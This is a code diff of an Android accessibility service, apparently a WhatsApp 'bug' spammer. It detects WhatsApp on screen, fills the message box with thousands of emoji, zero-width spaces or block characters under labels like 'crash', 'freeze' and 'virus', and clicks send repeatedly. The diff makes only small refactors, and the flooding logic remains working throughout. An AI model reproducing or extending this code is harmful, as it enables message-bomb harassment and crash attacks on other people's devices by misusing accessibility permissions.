@@ -19,22 +19,20 @@ public class SpamService extends AccessibilityService {
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
 
-        String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
-        if (pkg.equals("com.whatsapp")) {
+        if (root.getPackageName() != null && root.getPackageName().toString().equals("com.whatsapp")) {
             AccessibilityNodeInfo sendBtn = findNodeById(root, "com.whatsapp:id/send");
             AccessibilityNodeInfo inputBox = findNodeById(root, "com.whatsapp:id/entry");
 
             if (sendBtn != null && inputBox != null) {
                 isSending = true;
                 StringBuilder sb = new StringBuilder();
-
                 switch (MainActivity.bugType) {
                     case "crash": for (int i = 0; i < 3000; i++) sb.append("⚡"); break;
                     case "delay": for (int i = 0; i < 5000; i++) sb.append("\u200B"); break;
                     case "freeze": sb.append("FREEZE: "); for (int i = 0; i < 300; i++) sb.append("🔥"); break;
                     case "quota": sb.append("QUOTA: "); for (int i = 0; i < 1000; i++) sb.append("█"); break;
                     case "virus": sb.append("VIRUS: "); for (int i = 0; i < 1000; i++) sb.append("☣️"); break;
-                    case "call": sb.append("📞 CALLING..."); break; // Dummy payload buat call
+                    case "call": sb.append("CALLING..."); break;
                 }
 
                 inputBox.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
@@ -44,7 +42,6 @@ public class SpamService extends AccessibilityService {
 
                 sendBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                 count++;
-
                 new Handler(Looper.getMainLooper()).postDelayed(() -> isSending = false, 500);
             }
         }
